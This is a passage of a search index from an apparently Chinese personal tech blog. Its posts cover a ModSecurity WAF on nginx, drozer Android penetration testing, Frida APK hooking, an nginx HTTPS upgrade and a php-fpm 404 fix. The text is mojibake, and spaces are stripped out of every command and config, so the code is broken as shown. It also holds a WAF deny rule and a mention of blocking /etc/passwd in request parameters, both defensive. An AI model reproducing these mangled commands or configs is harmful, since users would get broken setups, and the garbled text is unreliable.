nginxè¿æ¥å™¨ï¼šgitclonehttps://github.com/SpiderLabs/ModSecurity-nginx.gitmodsecurity-nginx./configure--add-module=/path/to/modsecurity-nginxNGINXWEBSERVERå—é…ç½®ï¼šserver{listen8077;location/{default_typetext/plain;return200\"Thankyouforrequesting${request_uri}\\n\";}}æ•ˆæœå›¾ï¼š3ã€é˜²æŠ¤è§„åˆ™è‡ªå†™å¹¶æµ‹è¯•ï¼šä¸‹è½½ModSecurityé…ç½®æ–‡ä»¶ï¼Œæˆ‘çš„NGINXç›®å½•åœ¨/usr/local/nginxä¸‹ï¼Œæ‰€ä»¥æˆ‘çš„å‘½ä»¤å¦‚ä¸‹ï¼›cd/usr/local/nginx&amp;&amp;mkdirmodsec&amp;&amp;cdmodsecwgethttps://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommendedmvmodsecurity.conf-recommendedmodsecurity.confvimmodsecurity.conf#ä¿®æ”¹SecRuleEngineDetectionOnlyä¸ºSecRuleEngineOn#åŒæ ·ï¼Œæ·»åŠ é…ç½®ï¼švimmain.conf#å†…å®¹ä¸ºï¼šInclude/usr/local/nginx/modsec/modsecurity.confSecRuleARGS:url\"@containsadmin\"\"id:2234,deny,log,status:403\"#åœ¨è®¿é—®urlå†…ä¼ è¾“ç»™urlè¿™ä¸ªå‚æ•°ä¸­å­˜åœ¨adminå­—æ ·è¿›è¡Œæ‹¦æˆªï¼Œå¹¶è®°å½•ã€‚æŠ¥é”™ï¼šæŠ¥é”™è§£å†³ï¼š[emerg]\"modsecurity_rules_file\"directiveRuleserror.vim/etc/nginx/modsec/modsecurity.confæ³¨é‡Šæ‰ä¸‹é¢é…ç½®è¯­å¥#SecUnicodeMapFileunicode.mapping20127é…ç½®æˆåŠŸSERVERåŒºå—ï¼šserver{listen8077;server_namelocalhost;modsecurityon;modsecurity_rules_file/usr/local/nginx/modsec/main.conf;#charsetkoi8-r;#access_loglogs/host.access.logmain;location/{roothtml;default_typetext/plain;return200\"Thankyouforrequesting${request_uri}\\n\";#indexindex.htmlindex.htm;proxy_set_headerHost$host;}error_page404403405/403.html;location=/403.html{root/usr/local/nginx/html/403;}WAFé˜²æŠ¤æ•ˆæœå›¾ï¼ˆè¿™é‡Œå½“æ—¶ç¯å¢ƒçš„å›¾æä¸¢äº†ï¼Œéšä¾¿æ‰¾äº†ä¸€å¼ æ„æ€ä¸€ä¸‹ï¼‰ï¼šå¦‚æ— æ³•æµ‹è¯•æˆåŠŸå¯å‚è€ƒä»¥ä¸‹é“¾æ¥ï¼šã€Šæ‰‹æŠŠæ‰‹å¸¦ä½ æ­å»ºä¼ä¸šçº§WEBé˜²ç«å¢™ModSecurity3.0+Nginxã€‹ã€ŠModSecurityï¼šä¸€æ¬¾ä¼˜ç§€çš„å¼€æºWAFã€‹æ·»åŠ äº2021/02/053.è§„åˆ™åº“é…ç½®æˆ‘ä»¬ä»ä¸Šé¢å¾—åˆ°ï¼šmain.confé…ç½®æ–‡ä»¶è‡ªå†™è§„åˆ™åº“ï¼šå½“ç„¶ä¹Ÿå¯ä»¥å‘æ•£æ€ç»´ï¼Œç¦æ­¢å‚æ•°ä¼ å…¥/etc/passwdç­‰ï¼Œæ­¤å¤„æƒå½“æŠ›ç –å¼•ç‰æµ‹è¯•ï¼šInclude/usr/local/nginx/modsec/modsecurity.confSecRuleARGS:url\"@containsadmin\"\"id:2234,deny,log,status:403\"#åœ¨è®¿é—®urlå†…ä¼ è¾“ç»™urlè¿™ä¸ªå‚æ•°ä¸­å­˜åœ¨adminå­—æ ·è¿›è¡Œæ‹¦æˆªï¼Œå¹¶è®°å½•ã€‚æˆ‘ä»¬åœ¨å®‰å…¨å¼€å‘çš„è¿‡ç¨‹ä¸­è‹¥éœ€è¦è‡ªå†™è§„åˆ™åº“è¿›è¡ŒWEBé˜²å¾¡ï¼Œå¯å‚è€ƒï¼šæ•ˆæœå›¾ï¼šå‚è€ƒï¼šModSecurityä¸­æ–‡æ‰‹å†Œ4.æ€»ç»“åŸæ–‡å¤§é‡ç¯‡å¹…å†™çš„æ˜¯ä»£ç çš„é…ç½®é—®é¢˜ï¼ŒåæœŸä¿®æ”¹ååˆ é™¤äº†å¤§éƒ¨åˆ†ï¼Œæœ‰å…´è¶£çš„å¯ä»¥çœ‹ä¸Šé¢çš„ç¬¬äºŒä¸ªé“¾æ¥ï¼›è¿™ä¸€å—ï¼Œå…¶å®è·Ÿç€åŸæ•™ç¨‹èµ°äº†ä¸€ä¸ªå¼¯ï¼Œè¿™é‡ŒåŸä½œè€…åœ¨æ•™ç¨‹ä¸­åº”ç”¨çš„æ˜¯åå‘ä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸ŠæˆåŠŸçš„SERVERé…ç½®å—äº†è§£åˆ°å…¶å®ç›´æ¥é“¾æ¥WAFè®©è§„åˆ™åº“ç”Ÿæ•ˆå³å¯ã€‚ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Œå®‰å“æ¸—é€ã€:Amazing drozer Scanning frame",
    "category" : "",
    "tags"     : "ç¬”è®°, Android Reverse, æ¸—é€",
    "url"      : "/blog/2019/Drozer/Scan/in/android/",
    "date"     : "Dec 18, 2019",
    "content"  : "ç›´æ¥ä¸Šé“¾æ¥ï¼Œä¸å¤šbbã€‚æœ‰ç©ºå†™å®æˆ˜ï¼šï¼‰å‚è€ƒæ–‡æ¡£ï¼šå®‰å“æ¸—é€æ¡†æ¶ï¼Drozeræ¶æ„æµ…æâ€“æ¶æ„ç»„æˆå’Œè‡ªå®šä¹‰æ¨¡å—ä¸€ã€drozerè¿è¡Œæ¦‚è¿°è·ŸFrida-Hookæ¡†æ¶è¿è¡Œæ¨¡å¼å·®ä¸å¤šï¼Œå‡ä¸ºC/Sæ¨¡å¼ã€‚1ï¼‰ç§»åŠ¨ç«¯ï¼šdrozer-agentå¯åŠ¨pc-drozeræ¡†æ¶å‰éœ€æ‰“å¼€drozer-agentè¿›è¡Œç«¯å£è½¬å‘2ï¼‰pcç«¯ï¼šä¸»è¦æ§åˆ¶CLIç«¯ã€‚æ¸—é€æµ‹è¯•å‘½ä»¤å…¨éƒ¨åœ¨è¿™é‡Œè¾“å…¥æ‰§è¡Œï¼›1.1drozerç¯å¢ƒwindows/linux-debianpython2.7drozer&amp;drozer-angent1.2å‰æœŸå‡†å¤‡windows-drozer-2.4.4.msiä¸‹è½½debian-linux-drozer-2.4.4.debä¸‹è½½android-drozer-2.3.4.apkä¸‹è½½å¤šæä¸€å¥ï¼šmsiåç¼€ä¸ºwindowså¯æ‰§è¡Œæ–‡ä»¶ï¼ŒåŒå‡»å®‰è£…å³å¯ã€‚debï¼šdpkg-i&lt;debåŒ…&gt;apkæ˜¯å®‰å“åŒ…ï¼Œä¸‹è½½åˆ°æœ¬åœ°&lt;adbinstallapkåŒ…&gt;äºŒã€drozerå®æˆ˜C:\\Users\\æœ¬é˜¿ä¿¡&gt;drozerconsoleconnectSelecting7ad839637216ad27(OPPOOPPOR11Plus5.1.1)....:...o...r....a.............ndro..idsnemesisand..pr.otectorandroidsneme..,sisandprotectorandroids+...nemesisandprotectorandroidsn:..emesisandprotectorandroidsnemes....isandp,..,rotectorandro,..,idsnem..isisandp..rotectorandroid..snemisis.,andprotectorandroidsnemisisandprotec..torandroidsnemesisandprotectorandroid..snemisisandprotectorandroidsnemesisan:.dprotectorandroidsnemesisandprotector.drozerConsole(v2.4.4)dz&gt;updatingï½"
  },

  {
    "title"    : "ã€Œå®‰å“æ¸—é€ã€ï¼š Let&#39;s hook APK with fridaï½",
    "category" : "",
    "tags"     : "ç¬”è®°, Android Reverse, æ¸—é€",
    "url"      : "/blog/2019/Android/hook/",
    "date"     : "Dec 15, 2019",
    "content"  : "å¿™é‡Œå·é—²ï¼Œæœ¬æ–‡æ˜¯è®°å½•Hook-Fridaæ¡†æ¶ï¼Œå¦‚ä½•ä½¿ç”¨Fridaæ³¨å…¥ä»£ç ï¼Œåšåˆ°å¯¹å®‰å“apkè¿›è¡Œä»£ç hookæ³¨å…¥ã€‚Fridaæ¡†æ¶å‡†å¤‡1.fridaæ¡†æ¶å®‰è£…fridaæ¡†æ¶ä¸ºC/Sæ¨¡å¼ï¼Œå³å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯æ¨¡å¼ï¼š1ï¼‰ä¸€éƒ¨åˆ†æ˜¯è¿è¡Œåœ¨å®¢æˆ·ç«¯ä¸Šçš„å‘½ä»¤è¡Œäº¤äº’å·¥å…·ï¼šFridaCLIã€‚2ï¼‰å¦ä¸€éƒ¨åˆ†æ˜¯è¿è¡Œåœ¨ç›®æ ‡æœºå™¨ï¼ˆæœåŠ¡ç«¯ï¼Œåœ¨æœ¬æ–‡ä¸­åˆ™æ˜¯å®‰å“æ‰‹æœºï¼‰ä¸Šçš„ä»£ç æ³¨å…¥ï¼šfrida-serverã€‚è¿‡ç¨‹ä¸ºï¼šä½ åœ¨ç”µè„‘ä¸Šè¿›è¡Œfridaæ§åˆ¶ï¼Œå¼€å¯ç›®æ ‡æœºå™¨ï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šçš„serverç«¯åï¼Œæˆ‘ä»¬å¯ä»¥ä¸€äº›è‡ªå®šä¹‰æ“ä½œæ¯”å¦‚æŒ‡å®šhookè„šæœ¬ï¼Œè¿™äº›å‚æ•°é€šè¿‡å®¢æˆ·ç«¯å‘é€åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ¥æ”¶å‚æ•°åæ¥è¿›è¡Œæ“ä½œ2.ä¸€ä¸ªæµ‹è¯•apk3.hookä»£ç (æ­¤å¤„hookä»£ç ä¸ä¾¿è´´å‡ºï¼Œè§è°…)å®‰è£…Fridaè¿™é‡ŒFridaæ”¯æŒpython3å’Œpython2.7ï¼Œå› ä¸ºç¡®å®3å’Œ2.7ä¹‹é—´è¿˜æ˜¯æœ‰ä¸åŒçš„åœ°æ–¹ï¼Œæœ¬æ–‡ä»¥python2.7å®‰è£…Fridaä¸ºä¾‹ï¼šæŸ¥çœ‹pipç‰ˆæœ¬pip--versionpip18.1from/usr/lib/python2.7/dist-packages/pip(python2.7)##ä½ æƒ³åœ¨å“ªä¸ªç¯å¢ƒä¸‹è¿è¡ŒFridaï¼Œå°±ç”¨å“ªä¸ªå‘½ä»¤ï¼ˆpipã€pip3ï¼‰pip3--versionpip18.1from/usr/lib/python3/dist-packages/pip(python3.7)ç¡®è®¤æ˜¯åœ¨2.7ç‰ˆæœ¬ç¯å¢ƒä¸‹å®‰è£…å³å¯ï¼špipinstallfridaCollectingfridaDownloadinghttps://files.pythonhosted.org/packages/38/1b/8a462787cedda36c57227ed0babbd80c4c4cc5bc9c1f9b5aa285ed6aebba/frida-12.8.0.tar.gzBuildingwheelsforcollectedpackages:fridaRunningsetup.pybdist_wheelforfrida...\\SuccessfullybuiltfridaInstallingcollectedpackages:fridaSuccessfullyinstalledfrida-12.8.0å®‰è£…å®Œfridaï¼Œç»§ç»­å®‰è£…ä¾èµ–é¡¹ï¼šfrida-toolsï¼špipinstallfrida-tools\t100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ|348kæ­¤å¤„åŸºæœ¬fridaæ¡†æ¶å°±å®‰è£…å®Œæˆäº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹fridaçš„ç‰ˆæœ¬å·frida--version12.8.0å®‰è£…frida-serveræ­¤å¤„å®‰è£…çš„æ˜¯Fridaçš„æœåŠ¡ç«¯ï¼Œåœ¨æ‰‹æœºç«¯è¿è¡Œã€‚æ‰‹æœºç«¯å¤§å¤šä¸ºARMæ¶æ„ï¼Œä½†æœ‰çš„å°ä¼™ä¼´ä½¿ç”¨çš„æ¨¡æ‹Ÿå™¨ï¼Œæ‰€ä»¥å…ˆç”¨å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹æ‰‹æœºçš„cpuæ¶æ„ï¼šadbshell*daemonnotrunning;startingnowattcp:5037*daemonstartedsuccessfullyshell@angler:/$suroot@angler:/#getpropro.product.cpu.abiarm64-v8aå¦‚æœå›æ˜¾æ˜¯armå°±ä¸‹è½½armç‰ˆæœ¬ï¼Œå›æ˜¾x86å°±ä¸‹è½½x86ç‰ˆæœ¬ã€‚frida-serverä¸‹è½½è¿™é‡Œè®°ä½åƒä¸‡ä¸è¦ä¸‹è½½é”™äº†ï¼Œè¿›å»é¡µé¢ç›´æ¥CTRL+Fæœç´¢serverã€‚ä¸‹è½½å®Œæ¯•ï¼Œé‡å‘½åä¸ºfrida-serveræŠŠfrida-serverä¼ è¾“åˆ°æ‰‹æœºï¼Œï¼ˆæ³¨æ„ï¼špcç«¯fridaç‰ˆæœ¬å·ä¸ç§»åŠ¨ç«¯ä¸€è‡´ï¼‰ï¼š##PCç«¯adbdevicesadbpushfrida-server/data/local/tmpadbforwardtcp:27042tcp:27042adbforwardtcp:27043tcp:27043##ç§»åŠ¨ç«¯adbshellroot@angler:/data/local/tmp#cd/data/local/tmp/root@angler:/data/local/tmp#./frida-serverFrida-Hookå®æˆ˜åœ¨å¯åŠ¨æœåŠ¡ç«¯frida-serveråï¼Œåœ¨å®¢æˆ·ç«¯è¿›è¡Œæ“ä½œï¼š##æŒ‡å®šå¥½packåŒ…å’Œjsæ–‡ä»¶è·¯å¾„frida-U-f&lt;package-name&gt;-l&lt;hook.js-path&gt;##æç¤º&lt;package-name&gt;SpawnedæˆåŠŸåï¼Œè¾“å…¥%resumeé‡å¯appåä½¿app-hookæ³¨å…¥å¦‚ä¸‹å›¾ï¼Œappé‡å¯åæ£€æµ‹åˆ°hookæ¡†æ¶ä»£ç å¼¹å‡ºæç¤ºï¼Œæ­¤æ—¶jsä»£ç æ³¨å…¥æˆåŠŸã€‚å‚è€ƒæ–‡æ¡£ï¼šFridaè¯¦ç»†å®‰è£…æ•™ç¨‹"
  },

  {
    "title"    : "NGINXç¬”è®°ï¼šhttpå‡çº§httpsåè®®",
    "category" : "",
    "tags"     : "Web, æ’é”™, ç¬”è®°",
    "url"      : "/blog/2019/how-nginx/http2https/",
    "date"     : "Dec 7, 2019",
    "content"  : "çªˆçª•HTTPSï¼Œæ­£æ˜¯TCPçš„å¥½é€‘ï¼›howtousedhttptohttpswithnginx?Isâ€™ssoundsfantastic!å…¶å®è¯ä¹¦æ—©å°±é¢å‘ä¸‹æ¥äº†ï¼Œä¸€ç›´é…ç½®é…ä¸æˆåŠŸï¼ˆå°å£°bbï¼‰ã€‚çºªå¿µä¸€ä¸‹ï¼Œ2019-12-13å·ï¼Œç«™ç‚¹å‡çº§ä¸ºhttpsåè®®ã€‚å˜¿å˜¿1.å®‰è£…libsslåº“sudoapt-getinstalllibssl-devapt-getinstalllibpcre3libpcre3-dev2.sslç¼–è¯‘cdnginx/./configure--prefix=/usr/local/nginx--with-http_stub_status_module--with-http_ssl_module--with-file-aio--with-http_realip_modulemakeå¦‚æœå®‰è£…äº†nginxï¼Œåˆ°è¿™é‡Œç»“æŸã€‚åä¹‹å†åŠ makeinstallcd#ä½ è§£å‹nginxçš„ç›®å½•/sbin/./nginx-Vnginx-V#æ³¨æ„æ˜¯å¤§vï¼Œçœ‹åˆ°ä¸‹é¢æœ‰--with-http_ssl_moduleæ¨¡å—å³å¯nginxversion:nginx/1.16.1builtwithOpenSSL1.1.1d10Sep2019TLSSNIsupportenabledconfigurearguments:--with-cc-opt='-g-O2--with-http_ssl_modulecpnginx/usr/sbinå¤åˆ¶åˆ°å¿«é€Ÿå¯åŠ¨ç›®å½•å³å¯3.è®¤è¯é…ç½®è¯ä¹¦ç”³è¯·ä¸‹æ¥åæŠŠè¯ä¹¦ä¼ åˆ°æœåŠ¡å™¨ä¸Šå°±è¡Œäº†ï¼Œé…ç½®nginxçš„httpsåŒºå—å³å¯ã€‚http{server{listen443;server_nameXXX;sslon;ssl_certificate/usr/local/nginx/conf/cert/214.pem;#ä½ è‡ªå·±çš„è¯ä¹¦åœ°å€ssl_certificate_key/usr/local/nginx/conf/cert/21.key;ssl_session_timeout5m;ssl_ciphersECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;ssl_protocolsTLSv1TLSv1.1TLSv1.2;ssl_prefer_server_cipherson;location/{\t}\t}}nginx-tsystemctlreloadnginxAMAZING:itâ€™sfailedé…ç½®å®Œç¾æ»‹æ»‹å»éªŒè¯ç½‘ç«™ï¼Œç•ï¼ˆzhiï¼‰ç•ï¼ˆgaoï¼‰ç¼©ï¼ˆqiï¼‰ç¼©ï¼ˆangï¼‰çš„è¾“å…¥ç«™ç‚¹httpsåè®®åœ°å€ï¼Œç»“æœå‚»äº†çœ¼ï¼Œè¿˜æ˜¯httpçš„åè®®æç¤ºï¼Œå¥½æ°”ã€‚èµ¶ç´§è¶ç€sshè¿˜æ²¡æ–­å¼€èµ¶ç´§æŸ¥çœ‹é…ç½®å“ªé‡Œå‡ºäº†é—®é¢˜ã€‚æ€è·¯ï¼šå› ä¸ºé…ç½®äº†sslï¼Œç›‘å¬äº†443ç«¯å£ã€‚æ‰€ä»¥æœåŠ¡å™¨è‚¯å®šåœ¨ç›‘å¬äº†443ç«¯å£ï¼Œå…ˆæŸ¥æŸ¥çœ‹ï¼šnetstatus-tunlp|grep443#å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œé‚£çœ‹çœ‹æ‰€æœ‰ç›‘å¬æœåŠ¡å™¨netstatus-tunlp#ï¼ˆä»…ä»…å±•ç¤ºä¸€éƒ¨åˆ†ï¼‰å‘ç°æœåŠ¡å™¨å¹¶æœªç›‘å¬443ActiveInternetconnections(onlyservers)ProtoRecv-QSend-QLocalAddressForeignAddressStatePID/Programnametcp000.0.0.0:800.0.0.0:*LISTEN861/nginx:masterptcp00127.0.0.53:530.0.0.0:*LISTEN319/systemd-resolvetcp000.0.0.0:220.0.0.0:*LISTEN6029/sshdå¦‚ä¸Šä»£ç ï¼Œnginxé…ç½®äº†ç›‘å¬443,ï¼Œå®é™…ä¸Šlinuxå´æ²¡æœ‰ç›‘å¬ï¼Œé—®é¢˜è‚¯å®šå°±å‡ºåœ¨è¿™ä¸Šé¢é¦–å…ˆæ’é™¤ï¼šnginxé…ç½®é—®é¢˜ï¼Œå› ä¸ºnginxé…ç½®æ˜¯èƒ½å¤Ÿé€šè¿‡çš„ï¼Œæ‰€ä»¥æš‚æ—¶æ’é™¤ã€‚ç¬¬äºŒå°±æ˜¯é˜²ç«å¢™çš„é—®é¢˜ï¼Œå…ˆç™»ä¸Šæ§åˆ¶å°ç¡®è®¤443ç«¯å£å¼€æ”¾ï¼Œæ²¡é—®é¢˜ã€‚ç„¶åç™»ä¸ŠæœåŠ¡å™¨æŸ¥çœ‹æœåŠ¡å™¨é˜²ç«å¢™çŠ¶æ€ï¼Œå› ä¸ºæ˜¯ubuntuæœåŠ¡å™¨æ‰€æœ‰æŸ¥çœ‹ufwçŠ¶æ€ï¼šsystemctlstatusufwâ—ufw.service-UncomplicatedfirewallLoaded:loaded(/lib/systemd/system/ufw.service;enabled;vendorpreset:enabled)Active:active(exited)sinceFri2019-12-1310:46:00CST;1h54minagoDocs:man:ufw(8)Process:31826ExecStop=/lib/ufw/ufw-initstop(code=exited,status=0/SUCCESS)Process:31967ExecStart=/lib/ufw/ufw-initstartquiet(code=exited,status=0/SUCCESS)MainPID:31967(code=exited,status=0/SUCCESS)Dec1310:46:00iZj6cgn7odv59wmjjhe6zwZsystemd[1]:StartingUncomplicatedfirewall...Dec1310:46:00iZj6cgn7odv59wmjjhe6zwZsystemd[1]:StartedUncomplicatedfirewall.çœ‹åˆ°æœåŠ¡å™¨é˜²ç«å¢™æ˜¯activeçŠ¶æ€ï¼Œä½†æ˜¯æ¥ä¸‹æ¥å´è®©æˆ‘ç›®çªå£å‘†ï¼šufwstatusverboseStatus:inactiveufwstatusnumberedStatus:inactiveä¸ç®¡æ€ä¹ˆå†™å‘½ä»¤ï¼Œä»–éƒ½æ˜¯æç¤ºincativeï¼Œæˆ‘ç¬é—´å°±å´©æºƒäº†ï¼Œæˆ‘ç”šè‡³è¿˜å°è¯•äº†systemctlstatusverboseufwè¿™æ ·çš„è ¢å‘½ä»¤--|||åæ¥å„ç§æŸ¥å‘½ä»¤ï¼Œå› ä¸ºæˆ‘åšä¿¡æœåŠ¡å™¨ä¸Šè¿˜æœ‰ç¬¬äºŒä¸ªé˜²ç«å¢™ï½ç†ç”±ï¼šæ§åˆ¶å°å¼€æ”¾äº†443ï¼Œè€Œæˆ‘è¿›è¡ŒéªŒè¯å´éªŒè¯å¤±è´¥ï¼štelnegt$IP443åé¦ˆï¼štelnet:Unabletoconnecttoremotehost:Connectionrefusedï¼Œæ‰€ä»¥æˆ‘å°±ä¸€ç›´é’»åˆ°é˜²ç«å¢™çš„ç‰›è§’å°–å‡ºä¸æ¥äº†ã€‚å…œå…œè½¬è½¬ï¼Œåœˆåœˆåœ†åœ†ã€‚æ‰€ä»¥å°±ä¸€ç›´æ‹–åˆ°äº†ä»Šå¤©TATItcanbesolved.åæ¥è¯å®å…¶å®é—®é¢˜ä¸æ˜¯åœ¨é˜²ç«å¢™ä¸Šï¼Œä»Šå¤©å¶ç„¶ç½‘ä¸Šå†²æµªï¼Œçœ‹åˆ°ä¸ªå¸–å­:nginxhttpsé…ç½®åæ— æ³•è®¿é—®ï¼Œå¯èƒ½é˜²ç«å¢™åœ¨æ£é¬¼(å»ºè®®å³é”®æ–°å»ºé¡µé¢æ‰“å¼€ï½ç¬”èŠ¯)ï¼Œå¼•ç”¨æ–‡ç« çš„è¯:å¦‚æœæ— æ³•è¿æ¥ï¼Œé€šå¸¸æ˜¯é˜²ç«å¢™ï¼Œæˆ–è€…nginxä¸º(æœª)(æˆ‘çœŸæ˜¯ä¸ªå¤©æ‰)å¯åŠ¨ç­‰å¯èƒ½çš„å› ç´ ï¼›å†·é™åˆ†æé—®é¢˜ï¼ŒæŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼Œæ‰æ˜¯è§£å†³é—®é¢˜çš„åŠæ³•è”æƒ³åˆ°æˆ‘çš„é—®é¢˜ï¼Œéš¾é“ï¼Ÿæ˜¯nginxæ ¹æœ¬æ²¡æœ‰é‡å¯ï¼Ÿä¸€è¯­æƒŠé†’æ¢¦ä¸­äººã€‚èµ¶ç´§ç™»ä¸ŠæœåŠ¡å™¨ã€‚æ—¢ç„¶systemctlæ²¡ç”¨ï¼Œé‚£ç›´æ¥ç”¨nginxé…ç½®å‘½ä»¤nginx-sreloadè¾“å…¥chihou.pro-é”®å…¥F5å¥¹å±…ç„¶è·³è½¬äº†httpsé¡µé¢ï¼Œæˆ‘å“­äº†ã€‚å†·é™åˆ†æé—®é¢˜ï¼ŒæŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼Œæ‰æ˜¯è§£å†³é—®é¢˜çš„åŠæ³•è§£å†³é—®é¢˜çš„åŠæ³•åŠæ³•æ³•å¥¥åˆ©ç»™ï½ç»™...å¦‚æœè¿™ç¯‡æ–‡ç« å¸®åŠ©åˆ°äº†æ‚¨ï¼Œé‚£ä¸å¦‚åœ¨å¿ƒé‡Œå¤§å¤§å–Šä¸€å£°niceï½æ•¬ä¸Šã€‚æ„Ÿè°¢æ‚¨çš„é˜…è¯»å‚è€ƒï¼šå¯åŠ¨Nginxå‡ºç°Failedtostartnginx.service:unitnotfoundUbuntuç¼–è¯‘å®‰è£…nginxnginxåŠ¨æ€æ·»åŠ sslæ¨¡å—"
  },

  {
    "title"    : "ã€Œæ’é”™ã€ï¼šphp-fpmè§£æ404-not found",
    "category" : "",
    "tags"     : "Web, ç¬”è®°, æŠ€å·§, æ’é”™",
    "url"      : "/blog/2019/nginx/with/php/404error/",
    "date"     : "Dec 4, 2019",
    "content"  : "php+nginxè§£æé”™è¯¯ï¼ŒæŠ¥é”™404-NotFoundå‰è¨€å®¹å™¨å†…æ˜¯è‡ªå·±å†™çš„ä¸ªäººåšå®¢ï¼Œå¤„äºå®‰å…¨è€ƒè™‘ç”¨çš„æ˜¯é™æ€é¡µé¢åšå®¢ã€‚ä½†æ˜¯ç”±äºå…¬ç½‘ç»´æŠ¤åšå®¢è¾ƒä¸ºå›°éš¾ï¼ŒåŠ ä¸Šä¹‹å‰ç”¨çš„å¼€æºå­˜å‚¨äº‘æœåŠ¡é¡¹ç›®ï¼Œé‚£ä¹ˆå°±éœ€è¦phpæ¥è§£æï¼Œæ‰€ä»¥æ‰“ç®—è¯•ä¸€è¯•èƒ½ä¸èƒ½ã€Œnginx+phpã€çš„æ–¹å¼æ–¹ä¾¿ä¸ªäººç»´æŠ¤åšå®¢ã€‚æ‰€ä»¥æœ¬èœæœ€ç»ˆæƒ³å®Œæˆçš„æ˜¯è¿™æ ·çš„ï¼šstatichtmlï¼šwebblog+dynamicphpï¼šstoreserveré™æ€åšå®¢é¡µé¢+åŠ¨æ€phpé¡µé¢ä¼ è¾“markdownæ–‡ä»¶æŠ¥é”™ç°è±¡nginxå®¹å™¨èƒ½å¤Ÿå¯åŠ¨ï¼ŒHTMLé¡µé¢èƒ½å¤Ÿæ­£å¸¸å›æ˜¾ï¼Œä½†æ˜¯è§£æphpé¡µé¢ä¼šæŠ¥é”™ï¼š404-NOT-FOUNDï¼›viindex.php&lt;?phpphpinfo();?&gt;çœ‹åˆ°æ¯”æˆ‘å¤´è¿˜å¤§çš„404å¤´å°±ç–¼ï¼›ç¡®å®šå„ç§phpçš„é…ç½®éƒ½æ²¡é”™ã€‚server{location~\\.php{\tindexindx.phpindex.html;\tincludesnippets/fastcgi-php.conf;\tfastcgi_passunix:/var/run/php/php7.2-fpm.sock;\t\t}}å°±å„ç§ä¸Šç½‘æœphp-404ï¼Œé—®äººã€‚éƒ½æ²¡ç­”æ¡ˆã€‚æ’é”™è¿‡ç¨‹å¹¡ç„¶æ‚”æ‚Ÿæ­£å¥½æœ€è¿‘è–…äº†ä¸€ä¸ªåä¸ºäº‘æœåŠ¡å™¨ï¼Œåæ‰‹å°±æ˜¯nginx+phpå­˜å‚¨é¡¹ç›®å¾€ä¸Šå®‰è£…æ–¹ä¾¿ä¼ è¾“æ–‡ä»¶ï¼Œé…nginxçš„æ—¶å€™çœ‹åˆ°è¿™ä¹ˆä¸€è¡Œé…ç½®ï¼š###VirtualHostConfigs##\tinclude/etc/nginx/conf.d/*.conf;\tinclude/etc/nginx/sites-enabled/*;ç›´æ‹å¤§è…¿ï¼Œå½“åˆé…åšå®¢æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå«Œéº»çƒ¦ï¼Œç›´æ¥æŠŠ/etc/nginx/sites-enabled/è¿™è¡Œé…ç½®æ³¨é‡Šæ‰äº†ï¼Œè‡ªå·±åœ¨httpåŒºå—é…äº†php-location-serverã€‚èµ¶ç´§é‡æ–°é…ç½®php-fpmï¼šä¼ é€é—¨ï¼šã€Œç§»æ¤ã€ubuntuwitharm.å…¬ç½‘å­˜å‚¨å®¹å™¨æ­å»ºè®°å½•èŒ…å¡é¡¿å¼€é‡æ–°è½¯é“¾æ¥å®Œphp-fpmï¼Œè¿«ä¸åŠå¾…è®¿é—®phpæ–‡ä»¶ï¼ŒåˆæŠ¥é”™ï¼š502ï¼šBad-Gatewayèˆ’äº†ä¸€å£æ°”ï¼Œæ€»ç®—ä¸æ˜¯è¯¥æ­»çš„404äº†ã€‚502æŠ¥é”™åŸºæœ¬ä¸Šå°±æ˜¯php-fpmçš„é…ç½®é—®é¢˜äº†ï¼Œä¸€èˆ¬éƒ½æ˜¯fpmåœ¨è§£ææ—¶å‡ºé”™ã€‚åæ‰‹æŸ¥çœ‹ä¸€æ³¢phpè¿è¡Œæ—¥å¿—ï¼šcat/var/log/php7.2-fpm.log[04-Dec-201917:58:14]NOTICE:readytohandleconnections[04-Dec-201917:58:14]NOTICE:systemdmonitorintervalsetto10000msæœç„¶ï¼Œphp-fpmè§£æè¶…æ—¶äº†å¯¼è‡´æŠ¥é”™ï¼Œç›´æ¥æœç´¢è§£å†³ç­”æ¡ˆï¼›è¿åˆƒè€Œè§£åœ¨php-fpmé…ç½®æ–‡ä»¶ä¸‹åŠ å…¥fpmè¿è¡Œå‚æ•°:vi/etc/php/7.2/fpm/php-fpm.conf;;;;;;;;;;;;;;;;;;;GlobalOptions;;;;;;;;;;;;;;;;;;;pm.max_children=50pm.start_servers=15pm.min_spare_servers=10pm.max_spare_servers=40systemctlreloadphp-fpmåŒæ—¶å¯¹nginxå¢åŠ é…ç½®ï¼švi/etc/nginx/nginx.confhttp{fastcgi_connect_timeout300;fastcgi_send_timeout300;fastcgi_read_timeout300;}nginx-tnginx:theconfigurationfile/etc/nginx/nginx.confsyntaxisoknginx:configurationfile/etc/nginx/nginx.conftestissuccessfulæµ‹è¯•æ— 